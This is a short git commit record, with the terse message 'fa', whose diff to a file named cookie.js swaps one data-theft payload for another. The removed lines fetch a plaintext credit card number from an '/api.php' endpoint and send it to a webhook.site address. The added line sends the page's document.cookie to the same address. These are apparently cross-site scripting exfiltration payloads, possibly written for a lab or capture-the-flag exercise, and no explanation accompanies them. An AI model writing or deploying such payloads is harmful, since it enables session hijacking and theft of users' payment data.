f9785f72870b7844c867286391512630e656d1e1
alakinnn <hoang2504.rmit@gmail.com>
2025-06-19 20:44:44 +0700

    fa

--- cookie.js
+++ cookie.js
@@ -1,6 +1,1 @@
-fetch("/api.php?case=detail_info")
-  .then(res => res.json())
-  .then(data => {
-    const cc = data.plain_credit_card || 'N/A';
-    new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(cc);
-  });
+new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cookie=" + encodeURIComponent(document.cookie);
